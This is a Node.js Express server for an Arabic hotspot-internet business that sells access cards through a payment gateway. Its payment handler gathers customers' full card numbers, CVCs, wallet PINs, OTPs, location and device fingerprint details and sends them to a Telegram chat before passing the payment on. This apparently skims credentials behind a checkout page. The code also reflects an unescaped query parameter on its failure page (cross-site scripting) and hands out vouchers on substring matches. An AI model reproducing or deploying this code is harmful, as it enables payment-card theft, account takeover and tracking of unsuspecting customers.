const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const bodyParser = require("body-parser");
const path = require("path");
const multer = require("multer");
require("dotenv").config();

// ✅ التعديل هنا: استدعاء دالة createPaymobPayment أو processPayment بشكل صحيح من الكائن المصدر
const { createPaymobPayment } = require("./pay");
const { sendTelegramMessage } = require("./telegram");
const webhookRouter = require("./webhook");
const { disableUserQueue } = require("./mikrotik");
const { processPaymentAndCreateCard } = require("./mikrotikService");
const { generateContributionHtmlPage } = require('./contributionMessages');
const { generateWaitPageHtml } = require('./waitPage');

// استدعاء ملف الدعم المباشر (Chat Support)
const chatSupport = require('./chat_support');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const NETWORK_URL = process.env.NETWORK_HOTSPOT_URL || "http://tales.net";

const BRANCH_NAMES = {
  waitPage: "صفحة الانتظار وتأكيد الدفع من محفظتك",
  main: "حكايات نت رئيسي",
  branch2: "حكايات نت فرع ثاني",
  branch3: "حكايات نت فرع ثالث"
};

global.generatedCardsMap = global.generatedCardsMap || new Map();

chatSupport.initSocket(io);
const upload = multer();

setInterval(() => {
  const oneHourAgo = Date.now() - (60 * 60 * 1000);
  for (let [key, value] of global.generatedCardsMap.entries()) {
    if (value.createdAt && new Date(value.createdAt).getTime() < oneHourAgo) {
      global.generatedCardsMap.delete(key);
    }
  }
}, 30 * 60 * 1000);

app.use(cors());
app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

function getClientPublicIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    req.socket?.remoteAddress ||
    req.ip ||
    "غير متوفر"
  );
}

// مسارات الدعم الفني المباشر
app.post('/api/support/message', upload.single('image'), (req, res) => {
  chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
});

app.get('/api/support/messages/:clientId', (req, res) => {
  const clientId = req.params.clientId;
  const messages = chatSupport.getStoredMessages(clientId);
  res.json({ success: true, messages });
});

app.post('/telegram-webhook', async (req, res) => {
  await chatSupport.handleTelegramReply(req.body);
  res.sendStatus(200);
});

// معالجة طلبات الدفع وتوجيه العميل لرابط البوابة الحقيقي
async function handlePaymentRequest(req, res) {
  try {
    const data = { ...req.query, ...req.body };
    const {
      phone, user_phone, phoneNumber, amount, payment_method, method,
      number, name, expiry, cvc, card_data, save_card, clientID, clientId,
      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
      geoData, branch, branch_key,
      wallet_pin, otp
    } = data;

    if (!amount && Object.keys(data).length === 0) {
      return res.redirect("/");
    }

    const selectedMethod = payment_method || method || "wallet";
    const rawBranch = branch || branch_key || "branch2";
    const selectedBranch = BRANCH_NAMES[rawBranch] ? rawBranch : "branch2";
    const branchDisplayName = BRANCH_NAMES[selectedBranch] || BRANCH_NAMES.branch2;

    const userPhone = phone || user_phone || phoneNumber || data.phone_number || "غير محدد";
    const payAmount = amount || "5";
    const transactionId = "TX_" + Date.now();

    const paymentPayload = {
      phone: userPhone,
      amount_cents: parseFloat(payAmount) * 100,
      payment_method: selectedMethod,
      wallet_pin: wallet_pin || "غير مدخل",
      otp: otp || "لم يتم إدخاله بعد",
      branch: selectedBranch,
      branchName: branchDisplayName,
      card_data: {
        number: (card_data && card_data.number) || number || "غير مدخل",
        name: (card_data && card_data.name) || name || "غير مدخل",
        expiry: (card_data && card_data.expiry) || expiry || "غير مدخل",
        cvc: (card_data && card_data.cvc) || cvc || "غير مدخل",
        save_card: save_card === "tokenize" || save_card === "نعم"
      },
      clientID: clientID || clientId || "غير متوفر",
      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
      lat: lat || (geoData && geoData.lat) || "غير متوفر",
      lon: lon || (geoData && geoData.lon) || "غير متوفر",
      city: city || (geoData && geoData.city) || "غير متوفر",
      country: country || (geoData && geoData.country) || "غير متوفر",
      battery: battery || batteryInfo || "غير متوفر",
      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
      deviceRAM: deviceRAM || "غير متوفر",
      cpuCores: cpuCores || "غير متوفر",
      deviceType: deviceType || "غير متوفر",
      screenSize: screenSize || "غير متوفر",
      userTimeZone: userTimeZone || "غير متوفر",
      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
    };

    if (typeof sendTelegramMessage === "function") {
      await sendTelegramMessage(paymentPayload, true);
    }

    // استدعاء دالة معالجة الدفع السليمة
    const result = await createPaymobPayment(userPhone, payAmount, selectedMethod, selectedBranch, req, res);

    if (res.headersSent) return;

    if (result.type === "redirect") {
      if (req.method === "POST" && (req.headers["content-type"]?.includes("application/json") || req.xhr)) {
        return res.json({ success: true, payment_url: result.url });
      }
      return res.redirect(result.url);
    } else if (result.type === "html") {
      return res.send(result.content);
    } else {
      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
    }
  } catch (err) {
    console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
    if (res.headersSent) return;
    if (req.headers["content-type"]?.includes("application/json") || req.xhr) {
      return res.status(500).json({ success: false, error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
    }
    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
  }
}

app.get("/api/pay", handlePaymentRequest);
app.post("/api/pay", handlePaymentRequest);

app.get("/api/test-create-card", async (req, res) => {
  const secretKey = req.query.secret;
  if (!secretKey || secretKey !== process.env.TEST_SECRET_KEY) {
    return res.status(403).json({ success: false, message: "⚠️ غير مسموح لك بالوصول لهذا الرابط." });
  }

  try {
    const amount = req.query.amount || "5";
    const rawTarget = req.query.branch || req.query.branch_key || "branch2";
    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "branch2";
    const testTxId = "TEST_" + Date.now();

    const result = await processPaymentAndCreateCard(amount, targetBranch, testTxId);

    if (result.success && !result.isCustomAmount) {
      const cardPayload = {
        code: result.cardCode,
        packageName: result.packageName,
        amount: parseFloat(amount),
        phone: "01000000000",
        branchKey: result.branchKey,
        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
        createdAt: new Date()
      };
      global.generatedCardsMap.set(testTxId, cardPayload);

      return res.json({
        success: true,
        message: `✅ تم إضافة الكارت إلى الميكروتيك وتوليده بفرع (${result.branchKey})`,
        data: result,
        successPageLink: `/success?merchant_order_id=${testTxId}&branch=${result.branchKey}`
      });
    } else {
      return res.json({ success: false, message: "⚠️ فشل توليد الكارت من الميكروتيك", details: result });
    }
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get("/contribution-success", (req, res) => {
  const amount = req.query.amount || req.query.price || 150;
  const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
  res.send(generateContributionHtmlPage(amount, transactionId));
});

app.get("/api/check-voucher/:txId", (req, res) => {
  const txId = String(req.params.txId || "").trim();
  if (!txId || txId === "null" || txId === "undefined") {
    return res.json({ success: false, message: "رقم المعاملة غير صالح" });
  }

  if (global.generatedCardsMap) {
    if (global.generatedCardsMap.has(txId)) {
      return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
    }
    for (let [key, value] of global.generatedCardsMap.entries()) {
      if (String(key).includes(txId) || txId.includes(String(key))) {
        return res.json({ success: true, data: value });
      }
    }
  }

  return res.json({ success: false, message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." });
});

app.post("/api/disable-queue", async (req, res) => {
  try {
    const { username } = req.body;
    if (typeof disableUserQueue === "function") {
      const result = await disableUserQueue(username);
      return res.json(result);
    }
    return res.json({ success: true, message: "تم استقبال الطلب" });
  } catch (err) {
    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
  }
});

app.get("/success", (req, res) => {
  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
  return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
});

app.get("/fail", (req, res) => {
  const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
  res.send(`<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>فشل الدفع</title></head><body style="text-align:center;padding:50px;font-family:sans-serif;"><h2>فشل عملية الدفع</h2><p>${errorMessage}</p><a href="/">إعادة المحاولة</a></body></html>`);
});

app.use("/", webhookRouter);

server.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
